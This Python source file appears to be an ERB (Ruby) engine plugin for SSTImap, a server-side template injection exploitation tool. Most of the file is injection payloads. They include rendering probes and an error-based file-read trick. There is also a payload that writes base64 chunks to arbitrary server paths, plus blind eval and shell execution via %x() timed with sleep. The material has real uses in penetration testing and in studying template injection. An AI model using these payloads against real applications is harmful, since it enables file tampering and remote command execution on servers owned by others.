from plugins.languages import ruby
from utils import rand


class Erb(ruby.Ruby):
    priority = 5
    plugin_info = {
        "Description": """ERB template engine""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Homepage: https://docs.ruby-lang.org/en/master/ERB.html",
            "Github: https://github.com/ruby/erb",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': """<%={header[0]}+{header[1]}%>""",
                'trailer': """<%={trailer[0]}+{trailer[1]}%>""",
                'test_render': f"""<%=({rand.randints[0]}*{rand.randints[1]}).to_s%>""",
                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
            },
            'render_error': {
                'render': '{code}',
                'header': """<%$h=({header[0]}+{header[1]}).to_s%>""",
                # Body needs to set b as the output
                'trailer': """<%$t=({trailer[0]}+{trailer[1]}).to_s%><%File.read($h+$b+$t)%>""",
                'test_render': f"""<%$b=({rand.randints[0]}*{rand.randints[1]}).to_s%>""",
                'test_render_expected': f'{rand.randints[0] * rand.randints[1]}'
            },
            'write': {
                'call': 'inject',
                'write': """<%= require'base64';File.open('{path}', 'ab+') {{|f| f.write(Base64.urlsafe_decode64('{chunk_b64}')) }} %>""",
                'truncate': """<%= File.truncate('{path}', 0) %>"""
            },
            'evaluate': {
                'evaluate': """<%= {code} %>"""
            },
            'evaluate_error': {
                'evaluate': """<%$b=({code}).to_s%>"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """<%= require'base64';eval(Base64.urlsafe_decode64('{code_b64}'))&&sleep({delay}) %>"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """<%= require'base64';%x(#{{Base64.urlsafe_decode64('{code_b64}')+' && sleep {delay}'}}) %>"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # TODO: add contexts
        ])
